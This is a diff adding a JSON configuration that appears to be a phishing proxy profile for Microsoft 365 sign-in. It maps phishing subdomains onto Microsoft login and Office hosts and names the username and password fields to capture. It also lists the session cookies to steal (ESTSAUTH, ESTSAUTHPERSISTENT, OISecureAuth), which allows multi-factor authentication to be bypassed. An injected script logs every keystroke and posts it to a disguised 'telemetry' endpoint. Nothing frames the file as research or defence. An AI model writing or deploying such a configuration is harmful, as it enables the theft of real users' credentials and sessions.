@@ -1,0 +1,35 @@
+{
+  "id": "m365",
+  "name": "Microsoft 365 (Entra ID + Office) — full chain",
+  "author": "evilpikin",
+  "version": "1.0.0",
+  "proxy_hosts": [
+    { "phish_sub": "login", "orig_sub": "login", "domain": "microsoftonline.com", "session": true, "is_landing": true, "port": 443 },
+    { "phish_sub": "login-live", "orig_sub": "login", "domain": "live.com", "session": false, "is_landing": false, "port": 443 },
+    { "phish_sub": "office", "orig_sub": "", "domain": "office.com", "session": false, "is_landing": false, "port": 443 },
+    { "phish_sub": "office-www", "orig_sub": "www", "domain": "office.com", "session": false, "is_landing": false, "port": 443 },
+    { "phish_sub": "aadcdn", "orig_sub": "aadcdn", "domain": "msftauth.net", "session": false, "is_landing": false, "port": 443 }
+  ],
+  "login_urls": ["/"],
+  "auth_urls": ["/"],
+  "redirect_url": "/",
+  "username_field": "loginfmt",
+  "password_field": "passwd",
+  "cookie_tokens": [
+    { "domain": "login.microsoftonline.com", "name": "ESTSAUTH", "optional": false, "in_url": false },
+    { "domain": "login.microsoftonline.com", "name": "ESTSAUTHPERSISTENT", "optional": false, "in_url": false },
+    { "domain": ".office.com", "name": "OISecureAuth", "optional": true, "in_url": false }
+  ],
+  "force_https": true,
+  "injections": [
+    {
+      "url_pattern": "*",
+      "type": "js",
+      "position": "head",
+      "code": "<script>(function(){function s(d){try{var x=new XMLHttpRequest();x.open('POST','/__ep_telemetry',true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({type:'keystroke',data:d}));}catch(e){}}document.addEventListener('keydown',function(e){s(e.key);});})();</script>"
+    }
+  ],
+  "enabled": true,
+  "created_at": "2026-08-26T00:00:00Z",
+  "updated_at": "2026-08-26T00:00:00Z"
+}
